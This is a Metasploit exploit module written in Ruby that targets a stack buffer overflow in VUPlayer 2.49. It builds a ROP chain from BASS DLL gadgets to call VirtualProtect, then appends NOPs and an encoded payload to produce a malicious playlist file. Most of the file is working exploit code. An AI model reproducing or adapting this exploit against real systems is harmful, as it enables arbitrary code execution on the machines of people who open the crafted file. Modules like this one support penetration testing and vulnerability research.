##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VUPlayer pls Buffer Overflow ROP Bypass',
      'Description'    => %q{
          This module exploits a stack over flow in VUPlayer <= 2.49. When
          the application is used to open a specially crafted pls file, an buffer is overwritten allowing
          for the execution of arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Nipun Jaswal' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 750,
          'BadChars' => "\x00\x0a\x1a\x20\x40",
          #'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
          #'DisableNops'  =>  'True',
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'VUPlayer 2.49', { 'Ret' => 0x1010539f } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 18 2009',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.m3u']),
      ])
  end




def exploit
	#ROP Chain
	rop  = "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
	rop += "\x5c\xe2\x60\x10" #ptr to &VirtualProtect() [IAT BASSMIDI.dll]
	rop += "\xf1\xea\x01\x10" #MOV EAX,DWORD PTR DS:[EAX] # RTN [BASS.dll] 
	rop += "\x50\x09\x03\x10" #XCHG EAX,ESI # RETN [BASS.dll]
	rop += "\x0c\x80\x60\x10" #POP EBP # RETN 0x0C [BASSMIDI.dll]
	rop += "\x9f\x53\x10\x10" #& jmp esp BASSWMA.dll
	rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
	rop += "\x90"*12
	rop += "\xff\xfd\xff\xff" #201 in negative
	rop += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll]
	rop += "\x72\x2f\x03\x10" #XCHG EAX,EBX # RETN [BASS.dll] 
	rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
	rop += "\xc0\xff\xff\xff" #40 in negative
	rop += "\xb4\x4d\x01\x10" #NEG EAX # RETN [BASS.dll]
	rop += "\x6c\x8a\x03\x10" #XCHG EAX,EDX # RETN [BASS.dll]
	rop += "\x07\x10\x10\x10" #POP ECX # RETN [BASSWMA.dll]
	rop += "\x93\x83\x10\x10" #&Writable location [BASSWMA.dll]
	rop += "\x04\xdc\x01\x10" #POP EDI # RETN [BASS.dll]
	rop += "\x84\xa0\x03\x10" #RETN [BASS.dll]
	rop += "\xe7\x5f\x01\x10" #POP EAX # RETN [BASS.dll] 
	rop += "\x90"*4
	rop += "\xa5\xd7\x01\x10" #PUSHAD # RETN [BASS.dll]
	#Malicious File Creation
    	pls = rand_text_alpha_upper(1012)
    	pls << rop
    	pls << make_nops(8)
    	pls << payload.encoded
    	print_status("Creating '#{datastore['FILENAME']}' file ...")
    	file_create(pls)
  end
end
